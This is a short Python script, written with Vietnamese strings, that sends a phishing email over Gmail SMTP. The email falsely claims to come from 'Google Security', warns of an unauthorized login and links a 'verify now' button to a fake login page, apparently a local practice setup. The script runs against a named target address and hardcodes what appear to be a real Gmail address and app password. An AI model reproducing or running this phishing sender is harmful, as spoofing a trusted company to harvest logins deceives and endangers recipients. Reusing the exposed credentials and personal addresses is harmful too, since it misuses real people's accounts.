import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
YOUR_EMAIL = "nmquan.dz543@gmail.com"  
YOUR_PASSWORD = "hexd dodk urfw ctwd"  

def send_phishing_email(target_email):
    msg = MIMEMultipart()
    msg["From"] = "Google Security <no-reply@google.com>"  # Email giả
    msg["To"] = target_email
    msg["Subject"] = "🚨 Cảnh báo bảo mật: Phát hiện đăng nhập trái phép"

    
    body = """
    <html>
    <body>
        <h2 style="color:red;">Cảnh báo bảo mật từ Google</h2>
        <p>Chúng tôi phát hiện một đăng nhập bất thường vào tài khoản của bạn.</p>
        <p><b>Vui lòng xác minh ngay:</b></p>
        <a href="http://localhost:3000/login.html" style="padding: 10px; background: red; color: white; text-decoration: none;">Xác minh ngay</a>
        <p>Nếu không phải bạn, vui lòng bỏ qua email này.</p>
    </body>
    </html>
    """

    msg.attach(MIMEText(body, "html"))

    # Gửi email
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(YOUR_EMAIL, YOUR_PASSWORD)
        server.sendmail(YOUR_EMAIL, target_email, msg.as_string())
        server.quit()
        print(f"Email phishing đã gửi đến {target_email}")
    except Exception as e:
        print(f"Lỗi khi gửi email: {e}")

# Chạy thử
send_phishing_email("hoangbao0543@gmail.com")
